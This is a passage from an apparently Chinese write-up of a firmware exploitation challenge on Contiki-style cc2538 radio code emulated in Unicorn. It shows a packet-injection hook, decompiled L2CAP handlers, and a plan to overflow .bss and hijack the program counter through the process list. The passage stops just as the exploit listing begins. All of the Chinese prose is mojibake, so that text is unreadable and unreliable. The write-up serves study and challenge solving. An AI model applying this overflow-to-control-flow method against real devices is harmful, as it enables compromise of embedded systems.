<span class="c1"># to inject a packget of p32(0x20) + &#39;a&#39;*0x20</span>
<span class="n">packet_body</span> <span class="o">=</span> <span class="p">[</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)]</span>
<span class="n">packet</span> <span class="o">=</span> <span class="p">[</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)]</span> <span class="o">+</span> <span class="n">packet_body</span>

<span class="k">def</span> <span class="nf">hook_mem_read</span><span class="p">(</span><span class="n">mu</span><span class="p">,</span> <span class="n">access</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">user_data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">packet_injected</span><span class="p">,</span> <span class="n">packet</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[hook_mem_read] </span><span class="si">{</span><span class="n">access</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">address</span><span class="si">:</span><span class="s2">x</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">length</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">user_data</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">address</span> <span class="o">==</span> <span class="mh">0x40088828</span> <span class="ow">and</span> <span class="n">packet_injected</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">packet</span><span class="p">):</span>
            <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">packet</span><span class="p">[</span><span class="n">packet_injected</span><span class="p">])</span>
            <span class="n">packet_injected</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x4000000</span><span class="p">])</span>   <span class="c1"># to bypass sys_ctrl_init, random_init</span>
            <span class="c1"># print(f&#34;content: {mu.mem_read(address, 4)}, ready to write random: {r}&#34;)</span>
            <span class="n">mu</span><span class="o">.</span><span class="n">mem_write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
</code></pre></td></tr></table>
</div>
</div><p>è¿™æ ·æˆ‘ä»¬æˆåŠŸèµ°åˆ°äº†æ¼æ´å‡½æ•°ï¼Œå¹¶ä¸”æŠŠ <code>packetbuf</code> æˆåŠŸè¾“å…¥æˆäº† 0x20 ä¸ªå­—ç¬¦ aã€‚</p>
<h6 id="å¦‚ä½•è§¦å‘æ¼æ´">å¦‚ä½•è§¦å‘æ¼æ´</h6>
<p>å¯ä»¥çœ‹åˆ° <code>process_thread_cc2538_rf_process</code> ä¸­ä¼šå‘ <code>packetbuf_dataptr</code> å¤„è¯»æœ€å¤š 0x80 å­—èŠ‚ï¼Œè€Œåœ¨ .bss ä¸ºå…¶åˆ†é…çš„ç©ºé—´å°±æ˜¯ 0x80ï¼Œæš‚æ—¶ä¹Ÿæ²¡ä»€ä¹ˆå‘ç°ä»€ä¹ˆé—®é¢˜ã€‚éšç€ç†è§£ä»£ç çš„æ·±å…¥ï¼Œå¯ä»¥è®¤ä¸ºç½‘ç»œåŒ…ä¸€æ¬¡åªèƒ½æ”¶æœ€å¤š 0x80 å­—èŠ‚ï¼Œæ¯ä¸€ä¸ªç½‘ç»œåŒ…çš„æ•°æ®éƒ½ä¼šè¢«æ‹·è´åˆ° <code>packetbuf_dataptr</code> ä¸­ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="kr">__fastcall</span> <span class="nf">process_thread_cc2538_rf_process</span><span class="p">(</span><span class="n">pt</span> <span class="o">*</span><span class="n">process_pt</span><span class="p">,</span> <span class="n">process_event_t</span> <span class="n">ev</span><span class="p">,</span> <span class="n">process_data_t</span> <span class="n">data</span><span class="p">)</span>
<span class="p">{</span>
  <span class="p">...</span>
  <span class="n">packetbuf_clear</span><span class="p">();</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="n">packetbuf_dataptr</span><span class="p">();</span>
  <span class="n">v7</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="mh">0x80u</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">packetbuf_set_datalen</span><span class="p">(</span><span class="n">v7</span><span class="p">);</span>
    <span class="n">input</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="p">...</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>è¦è§¦å‘æ¼æ´ï¼Œæˆ‘ä»¬å¿…é¡»è¦å¼„æ¸…æ¥š channel æ˜¯å¹²ä»€ä¹ˆçš„ï¼Œå³å¦‚ä½•è®© <code>channel-&gt;rx_buffer.current_index</code> è¶…è¿‡ 0x80 é€ æˆæº¢å‡ºã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">input_l2cap_frame_flow_channel</span><span class="p">(</span><span class="n">l2cap_channel_t</span> <span class="o">*</span><span class="n">channel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">uint16_t</span> <span class="n">data_len</span><span class="p">)</span>
<span class="p">{</span>
  <span class="p">...</span>

  <span class="k">if</span> <span class="p">(</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">sdu_length</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>
    <span class="n">current_index</span> <span class="o">=</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">current_index</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v4</span> <span class="o">&gt;</span> <span class="mi">1280</span> <span class="o">-</span> <span class="n">current_index</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">curr_log_level_mac</span> <span class="o">&gt;</span> <span class="mi">1</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">LABEL_5</span><span class="p">;</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">sdu</span><span class="p">[</span><span class="n">current_index</span><span class="p">],</span> <span class="n">data</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">);</span>
    <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">current_index</span> <span class="o">+=</span> <span class="n">v4</span><span class="p">;</span>
<span class="nl">LABEL_10</span><span class="p">:</span>                                      
    <span class="k">if</span> <span class="p">(</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">sdu_length</span> <span class="o">&amp;&amp;</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">sdu_length</span> <span class="o">==</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">current_index</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v6</span> <span class="o">=</span> <span class="n">packetbuf_dataptr</span><span class="p">();</span>
      <span class="n">memcpy</span><span class="p">(</span><span class="n">v6</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">,</span> <span class="n">channel</span><span class="o">-&gt;</span><span class="n">rx_buffer</span><span class="p">.</span><span class="n">sdu_length</span><span class="p">);</span> <span class="c1">//vuln
</span><span class="c1"></span>      <span class="p">...</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>   
</code></pre></td></tr></table>
</div>
</div><p>è€Œè¿™ä¸ª channel æ˜¯åœ¨ <code>input</code> ä¸­é€šè¿‡ <code>get_channel_for_cid</code> å¾—åˆ°çš„ï¼Œä¼ ç»™åè€…çš„å‚æ•°æ˜¾ç„¶å¯æ§ã€‚åªéœ€è¦è®© <code>channel_for_cid</code> ä¸ä¸ºé›¶å°±èƒ½èµ°åˆ°æ¼æ´åˆ†æ”¯ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">input</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">v0</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">packetbuf_dataptr</span><span class="p">();</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">packetbuf_datalen</span><span class="p">();</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">packetbuf_attr_0</span><span class="p">(</span><span class="mh">0xBu</span><span class="p">);</span>
  <span class="p">...</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="o">*</span><span class="p">)</span><span class="n">v0</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
  <span class="n">channel_for_cid</span> <span class="o">=</span> <span class="n">get_channel_for_cid</span><span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="n">_WORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v0</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
  <span class="p">...</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">5</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">input_l2cap_frame_signal_channel</span><span class="p">(</span><span class="n">v0</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
    <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span> <span class="c1">// return
</span><span class="c1"></span>  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">channel_for_cid</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">input_l2cap_frame_flow_channel</span><span class="p">(</span><span class="n">channel_for_cid</span><span class="p">,</span> <span class="n">v0</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span><span class="c1">// vul
</span><span class="c1"></span>    <span class="p">...</span>
    <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span> <span class="c1">// return
</span><span class="c1"></span>  <span class="p">}</span>

<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>ä»£ç é€»è¾‘å³å°†æµ®å‡ºæ°´é¢ï¼Œå†æ¥çœ‹ <code>get_channel_for_cid</code>ï¼ŒæŸ¥çœ‹ l2cap_channel_count çš„äº¤å‰å¼•ç”¨å‘ç°åœ¨ <code>input_l2cap_conn_req</code> ä¸­æ”¹å˜ï¼Œè€Œä¸Šä¸ªä»£ç æ®µä¸­ <code>input_l2cap_frame_signal_channel</code> æ°å¥½ä¼šè°ƒç”¨æ­¤å‡½æ•°ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">l2cap_channel_t</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">get_channel_for_cid</span><span class="p">(</span><span class="kt">uint16_t</span> <span class="n">own_cid</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// r0
</span><span class="c1"></span>
  <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int16</span><span class="p">)(</span><span class="n">own_cid</span> <span class="o">-</span> <span class="mh">0x41</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&gt;=</span> <span class="n">l2cap_channel_count</span> <span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">return</span> <span class="o">&amp;</span><span class="n">l2cap_channels</span><span class="p">[</span><span class="n">v1</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>é‚£ä¹ˆçœ‹ä¸Šå»æˆ‘ä»¬å¾—å…ˆè¿› <code>input_l2cap_frame_signal_channel</code> æ¥å¢åŠ  channel</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">input_l2cap_frame_signal_channel</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="n">data_len</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// r3
</span><span class="c1"></span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
  <span class="k">switch</span> <span class="p">(</span> <span class="n">v3</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">case</span> <span class="mi">20</span><span class="o">:</span>
      <span class="n">input_l2cap_conn_req</span><span class="p">(</span><span class="n">data</span> <span class="o">+</span> <span class="mi">5</span><span class="p">);</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="p">...</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>å¢åŠ å®Œ channel åæˆ‘ä»¬å°±èƒ½æˆåŠŸè¿›å…¥æ¼æ´å‡½æ•° <code>input_l2cap_frame_flow_channel</code> äº†ã€‚è¿™ä¸ªå‡½æ•°å¤§æ¦‚é€»è¾‘æ˜¯ï¼šç»´æŠ¤ä¸€ä¸ªæ¯” 0x80 bytes çš„æ›´å¤§ï¼ˆ0x504 bytesï¼‰çš„ç¼“å†²åŒºï¼Œå¦‚æœç½‘ç»œåŒ…ä¸åˆ†ç‰‡ï¼ˆå³åªæœ‰ä¸€ä¸ªç½‘ç»œåŒ…ï¼Œå…¶æ€»å¤§å°åŸŸä¸å½“å‰ç‰‡å¤§å°åŸŸç›¸åŒï¼‰ï¼Œåˆ™æŠŠå†…å®¹æ‹·è´åˆ°ç¼“å†²åŒºå¤´éƒ¨ï¼›å¦‚æœç½‘ç»œåŒ…åˆ†ç‰‡ï¼Œåˆ™åç»­æ¥æ”¶æ–°çš„ç½‘ç»œåŒ…ä¼šæŠŠå†…å®¹ä¸æ–­æ¥åœ¨åé¢ï¼Œå®ç°æ‹¼æ¥ï¼›æœ€ç»ˆç›´åˆ°æ¥æ”¶åˆ°çš„å¤§å°ä¸ç¬¬ä¸€ä¸ªç½‘ç»œåŒ…æ€»å¤§å°åŸŸçš„å€¼ç›¸åŒï¼Œä¸€æ¬¡æ€§åœ°æŠŠè¿™ä¸ªå¤§ç¼“å†²åŒºçš„å†…å®¹æ‹·è´å› <code>packetbuf_dataptr</code>ã€‚è€Œæˆ‘ä»¬çŸ¥é“ <code>packetbuf_dataptr</code> åªæœ‰ 0x80 bytes å¤§å°ï¼Œé‚£ä¹ˆå¤šæ„é€ å‡ ä¸ªåˆ†ç‰‡åŒ…å°±èƒ½è½»æ˜“å®ç°æº¢å‡ºã€‚</p>
<p>æ‰€ä»¥æ€»çš„æ¥è¯´æˆ‘ä»¬è¦è¿™ä¹ˆåšï¼š</p>
<ol>
<li>
<p>è§¦å‘ 158 å·ä¸­æ–­ï¼Œå¹¶ç²¾å¿ƒæ„é€ ç½‘ç»œåŒ…ä½¿å…¶è¿›å…¥ <code>input</code> çš„ <code>input_l2cap_frame_signal_channel</code> åˆ†æ”¯ã€‚</p>
</li>
<li>
<p>å¤šæ¬¡è§¦å‘ 158 å·ä¸­æ–­ï¼Œå¹¶ç²¾å¿ƒæ„é€ ç½‘ç»œåŒ…ä½¿å…¶è¿›å…¥ <code>input</code> çš„ <code>input_l2cap_frame_flow_channel</code> åˆ†æ”¯ï¼Œæœ€ç»ˆè§¦å‘è¶Šç•Œæ‹·è´ã€‚</p>
</li>
</ol>
<p>è¦è¿™ä¹ˆåšå°±éœ€è¦å¤šæ¬¡æ³¨å…¥ä¸­æ–­ï¼Œä¸ç¦ä¸ºå‰é¢ä½¿ç”¨çš„é£é›¨é£˜æ‘‡ç ´çƒ‚ä¸å ªçš„ä¸­æ–­æ³¨å…¥ä»£ç æäº†æŠŠæ±—ï¼ˆä½†äº‹å®ä¸Šå¥½åƒæ²¡å‡ºå¤ªå¤šé—®é¢˜ï¼‰ã€‚ç”±äº Unicorn ç–‘ä¼¼ä¸æ”¯æŒ WFI æŒ‡ä»¤ï¼Œæ‰€ä»¥éœ€è¦æŠŠ 0x210768 å¤„çš„ä»£ç  patch æ‰ï¼Œä½¿å…¶èƒ½æ¨¡æ‹Ÿä¸»å‡½æ•°ä¸­çš„å¾ªç¯ã€‚</p>
<blockquote>
<p>WFI æŒ‡ä»¤ä¼šå°†ç³»ç»Ÿä¼‘çœ ï¼Œåªæœ‰è¢«ä¸­æ–­æ‰èƒ½å”¤é†’åå¹¶ç»§ç»­æ‰§è¡Œï¼Œè¿™æ ·åœ¨å®é™…ç¯å¢ƒä¸­èƒ½å¤§å¤§å‡å°‘èƒ½é‡æ¶ˆè€—ï¼Œå¹¶åœ¨ä¸€å®šç¨‹åº¦ä¸Šå®ç°äº†å“åº”å¼å¤„ç†è¯·æ±‚çš„åœºæ™¯ï¼Œç®€ç›´å¤ªæ™ºæ…§äº†ã€‚</p>
</blockquote>
<h6 id="æ§åˆ¶-pc">æ§åˆ¶ PC</h6>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥å†™ expã€‚ä»”ç»†è§‚å¯Ÿä¸€ä¸‹ï¼Œæº¢å‡ºå‘ç”Ÿåœ¨ .bss æ®µï¼Œè€Œç†è®ºä¸Šæ¥è¯´æˆ‘ä»¬å¯ä»¥å‘åæ— é™æº¢å‡ºã€‚åæ–¹å¯ä»¥çœ‹åˆ°ä¸€ä¸ªç›¸å½“æœ‰å‰é€”çš„ç»“æ„ä½“æŒ‡é’ˆ <code>notification_process_0</code>ï¼Œå®ƒä»£è¡¨äº†ä¸€ä¸ªè¿›ç¨‹ï¼Œè€Œè¿™ä¸ªè¿›ç¨‹ä¼šè¢« 161 å·ä¸­æ–­å‡½æ•° <code>pka_isr</code> é—®è¯¢ï¼Œå¹¶æŒ‚åˆ°æœ€å‰æ–¹ã€‚å¦‚æœæˆ‘ä»¬å°†å…¶ä¿®æ”¹æŒ‡å‘ä¸€æ®µå¯æ§çš„å†…å­˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä¼ªé€ è¿›ç¨‹çš„å…³é”®æ•°æ®ã€‚å¦‚æœä¿®æ”¹å…¥å£ç‚¹ï¼Œé‚£ä¹ˆå½“è¯¥è¿›ç¨‹è¢«è¿è¡Œæ—¶ä¾¿æ§åˆ¶äº† PCã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">pka_isr</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0xE000E290</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x10000</span><span class="p">;</span>
  <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0xE000E190</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x10000</span><span class="p">;</span>
  <span class="n">__dsb</span><span class="p">(</span><span class="mh">0xFu</span><span class="p">);</span>
  <span class="n">__isb</span><span class="p">(</span><span class="mh">0xFu</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">notification_process_0</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">process_poll</span><span class="p">((</span><span class="n">process</span> <span class="o">*</span><span class="p">)</span><span class="n">notification_process_0</span><span class="p">);</span>
    <span class="n">notification_process_0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>ä½†è¿™ä¸ªè¿›ç¨‹ä¼¼ä¹ä»æ¥æ²¡æœ‰å¯åŠ¨è¿‡ï¼Œè¢« poll ä¹Ÿä¸ä¼šè¿è¡Œã€‚ï¼ˆæ³¨æ„ï¼Œå¦‚å‰æ–‡æ‰€è¯´ï¼Œä¸€ä¸ªè¿›ç¨‹åªæœ‰åœ¨è¢« start ä¹‹åæ‰èƒ½è¢« runï¼‰ã€‚å¥½æ¶ˆæ¯æ˜¯ <code>process_list</code> ä¹Ÿåœ¨æº¢å‡ºç‚¹åæ–¹ï¼Œæ—¢ç„¶ <code>notification_process_0</code> ä»æ¥æ²¡æœ‰è¢«æŒ‚ä¸Š <code>process_list</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æŠŠå®ƒâ€œæ‰‹åŠ¨â€æŒ‚ä¸Šå»ï¼</p>
<p>æ€»ç»“ä¸€ä¸‹åˆ©ç”¨æ€è·¯</p>
<ol>
<li>
<p>åˆ©ç”¨æº¢å‡ºç¯¡æ”¹ <code>notification_process_0</code> æŒ‡é’ˆä½¿å…¶æŒ‡å‘å—æ§åˆ¶çš„å†…å­˜åŒºåŸŸï¼ˆæ¯”å¦‚å‰é¢æåˆ°çš„å¤§ç¼“å†²åŒºï¼‰ï¼Œä¼ªé€ å…¥å£ç‚¹ä¸º 0xbabecafe</p>
</li>
<li>
<p>åˆ©ç”¨æº¢å‡ºç¯¡æ”¹ <code>process_list</code> åˆ—è¡¨å¤´ä¸º <code>notification_process_0</code></p>
</li>
<li>
<p>è§¦å‘ 161 å·ä¸­æ–­ï¼Œå®ƒå°†æŠŠ <code>notification_process_0</code> è¿›ç¨‹æåˆ°æœ€å‰æ–¹ã€‚åç»­æ‰§è¡Œ <code>run_process</code> æ—¶å°†éå† <code>process_list</code> åˆ—è¡¨ï¼Œä¾æ¬¡å°†éœ€è¦ poll çš„è¿›ç¨‹å¯åŠ¨ï¼Œå¦‚æ­¤ä¾¿å¯åŠ¨äº† <code>notification_process_0</code> è¿›ç¨‹ï¼Œä»å…¥å£ç‚¹ 0xbabecafe å¤„æ‰§è¡Œã€‚</p>
</li>
</ol>
<p>exp å¦‚ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
